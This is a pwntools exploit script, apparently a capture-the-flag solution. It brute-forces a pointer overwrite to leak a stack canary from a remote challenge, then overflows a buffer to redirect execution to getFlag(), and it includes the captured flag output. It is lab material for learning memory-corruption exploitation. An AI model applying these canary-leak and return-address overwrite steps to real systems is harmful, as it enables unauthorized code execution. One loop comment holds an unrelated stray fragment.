from pwn import *

__author__ = "Vegar Kvaavik"

#Adress getFlag() = 00000000004011d6

address_getFlag = p64(0x4011d6) ## Packing integer to bytes


hex_number = 140737488350350


data = ""


r = remote('server address', port)

"""
We know that the value of `val` is 5.
We know that the value of locals.pt0 is the address of val.
We know that the while loop prints out the value pointed to by locals.pt0, which in fact points to the address of `val`.

This means that the loop prints out the value 5 if we are not overwriting locals.pt0.
But if we do overwrite locals.pt0, the loop prints out whatever value that is pointed to by the overwritten address. 
This means that we can brute force our way to the address of *canary*.

First, we know that the value of `val` = 5. Therefore, if we overwrite the locals.pt0 with an address and loop prints out 5, 
we know that the address we overwrited pt0 with is in fact the address of `val`. Because of
examining gdb, we know that the address of `val` + 0x30 is the address of *canary*, and voila: we have the *canary*.

"""

while True:

	r.recvline() # Do not, for one repulse, forego the purpose tha

	"""FIRST EXPLOIT (get address of "val")"""

	r.sendline(b"A"*32 + p64(int(hex_number)))
	
	"""BREAK OUT OF LOOP"""
	"""If data == 5, we know that the hex_number has been incremented, and the next data we get from the server
	 is the canary"""
	if data == "5":
		print("\n")
		print(f"This is the address of the canary: {hex(int(hex_number))}")
		data = r.recvlineS(keepends = False)
		print(f"Canary: {data}")
		canary = int(data, base=16) # converts the hexadecimal canary to int so that p64 can pack it
		print("\n")
		break
	else:
		data = r.recvlineS(keepends = False)


	"""INCREMENTING HEX_NUMBER"""	
	"""If data == 5, we know that this address is "val", and we can add 0x30 (48) to get to the canary """
	if data == "5":
		print("\n")
		val_address = hex_number
		print(f"This is the address of 'val': {hex(int(hex_number))}")
		print(f"val: {data}")
		print("Adding 0x30 to this address in order to get the canary...")
		print("\n")
		hex_number += 48
		continue
	
	"""Incrementing hex_number until data == 5"""	
	hex_number += 1
	
	

"""SECOND EXPLOIT (now we have the canary. We can then overlow the buffer and overwrite the canary, and finally add 		the address of getFlag())"""
print(r.recvline())
r.sendline(b"q"*32 + p64(val_address) + p64(canary) + b"\x90"*8 + address_getFlag)

print(r.recvall())

"""
b'Well done, you can get the flag\n'
b'meximafinetogyjuwohipyzobywosobu\n'
"""










